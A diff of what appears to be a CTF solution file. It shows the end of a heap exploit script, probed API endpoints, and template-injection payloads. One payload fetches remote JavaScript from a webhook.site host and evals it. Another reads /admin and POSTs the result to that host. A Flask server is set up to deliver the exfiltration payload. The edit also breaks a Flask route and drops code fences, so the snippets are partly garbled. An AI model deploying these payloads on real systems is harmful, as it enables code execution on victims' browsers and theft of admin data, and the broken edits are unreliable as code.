@@ -75,42 +75,12 @@ def pwn():
     edit(9,len(fake_io),fake_io)
     p.interactive()
 pwn()
-```
-
-
-
-```
 /swagger-ui/index.html
 /v3/api-docs/
-```
-
-
-
-```
 /api/v1/users/updatePermission
-```
-
-
-
-```
 profileRegex := regexp.MustCompile(`^.{0,80}$`)
-```
-
-
-
-```
 {{fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69').then(a=>a.text().then(a=>eval(a)))}}
-```
-
-
-
-```
 {{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69/',{method:'POST',body:r}))}}
-```
-
-
-
-```
 from flask import Flask, Response
 
 app = Flask(__name__)
@@ -123,19 +93,14 @@ def after_request(response):
     return response
 
 @app.route('/', defaults={'path': ''})
-@app.route('/<path:path>')
+@app.route('/')
 def serve_js(path):
     js_content = "{{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69/',{method:'POST',body:r}))}}"
-    # js_content = "{"html":"<img src=x onerror=alert(document.cookie)>"}"
+    # js_content = "{"html":""}"
     return Response(js_content, mimetype='application/javascript')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0',port=19002)
-```
-
-
-
-```
 from PIL import Image, ImageDraw, ImageFont
 import numpy as np
 from skimage.metrics import structural_similarity as ssim
